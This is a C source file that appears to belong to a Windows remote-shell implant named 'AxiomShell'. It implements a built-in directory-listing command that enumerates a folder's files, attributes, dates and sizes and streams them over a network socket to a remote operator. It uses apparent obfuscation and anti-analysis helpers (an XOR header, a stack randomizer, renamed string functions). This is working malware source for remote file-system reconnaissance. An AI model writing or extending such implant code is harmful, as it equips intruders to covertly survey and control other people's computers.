#include "AxiomShell.h"
#include "autoxor.h"
#include "ls.h"
#include "Glibc.h"

#include <minwinbase.h>
#include <errhandlingapi.h>
#include <handleapi.h>
#include <stdio.h>

void BUILTIN_LS_DISPLAY_folder_contents(SOCKET sock, char *folder_path)
{
	STACK_RANDOMIZER;
	char searchBuffer[260];
	CHAR sockBuffer[1024];
	WIN32_FIND_DATA ffd;
	HANDLE hFind;
	SYSTEMTIME lpSystemTime;
	LARGE_INTEGER fileSize;
	DWORD fileAttr;

	memset(sockBuffer, 0, sizeof(sockBuffer));
	drunk_strcpy(searchBuffer, folder_path);	
	drunk_strcat(searchBuffer, "\\*");
	hFind = FindFirstFileA(searchBuffer, &ffd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		xsnprintf(sockBuffer, sizeof(sockBuffer), "[!] Error opening folder %s for listing (Err:%ld)\n", folder_path, GetLastError());
		JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
		return;
	}

	xsnprintf(sockBuffer, sizeof(sockBuffer), "Contents of %s:\n", folder_path);
	JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
	do {
		memset(searchBuffer, 0, sizeof(searchBuffer));
		drunk_strcpy(searchBuffer, folder_path);
		drunk_strcat(searchBuffer, "\\");
		drunk_strcat(searchBuffer, ffd.cFileName);
		FileTimeToSystemTime((FILETIME*)&ffd.ftLastWriteTime, (LPSYSTEMTIME)&lpSystemTime);
		fileSize.LowPart = ffd.nFileSizeLow;
		fileSize.HighPart = ffd.nFileSizeHigh;
		fileAttr = GetFileAttributesA(searchBuffer);
		if (fileAttr == INVALID_FILE_ATTRIBUTES) {
			//printf("[!] %s: failed to read attributes (%ld)\n", searchBuffer, GetLastError());
			fileAttr = FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
		}

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			xsnprintf(
				sockBuffer, sizeof(sockBuffer),
				"d%c%c%c%c%c%-5s %.2d/%.2d/%.2d %.2d:%.2d	%15s %s\n",
				(fileAttr & FILE_ATTRIBUTE_ARCHIVE ? 'a' : '-'),
				(fileAttr & FILE_ATTRIBUTE_READONLY ? 'r' : '-'),
				(fileAttr & FILE_ATTRIBUTE_HIDDEN ? 'h' : '-'),
				(fileAttr & FILE_ATTRIBUTE_SYSTEM ? 's' : '-'),
				(fileAttr & FILE_ATTRIBUTE_REPARSE_POINT ? 'l' : '-'),
				"",
				lpSystemTime.wDay, lpSystemTime.wMonth, lpSystemTime.wYear,
				lpSystemTime.wHour, lpSystemTime.wMinute,
				"<DIR>",
				ffd.cFileName
			);
			JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
		}
		else {
			xsnprintf(
				sockBuffer, sizeof(sockBuffer),
				"-%c%c%c%c%c%-5s %.2d/%.2d/%.2d %.2d:%.2d	%15lld %s\n",
				(fileAttr & FILE_ATTRIBUTE_ARCHIVE ? 'a' : '-'),
				(fileAttr & FILE_ATTRIBUTE_READONLY ? 'r' : '-'),
				(fileAttr & FILE_ATTRIBUTE_HIDDEN ? 'h' : '-'),
				(fileAttr & FILE_ATTRIBUTE_SYSTEM ? 's' : '-'),
				(fileAttr & FILE_ATTRIBUTE_REPARSE_POINT ? 'l' : '-'),
				"",
				lpSystemTime.wDay, lpSystemTime.wMonth, lpSystemTime.wYear,
				lpSystemTime.wHour, lpSystemTime.wMinute,
				fileSize.QuadPart,
				ffd.cFileName
			);
			JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
		}
	} while (FindNextFileA(hFind, &ffd) != 0);
	FindClose(hFind);
}


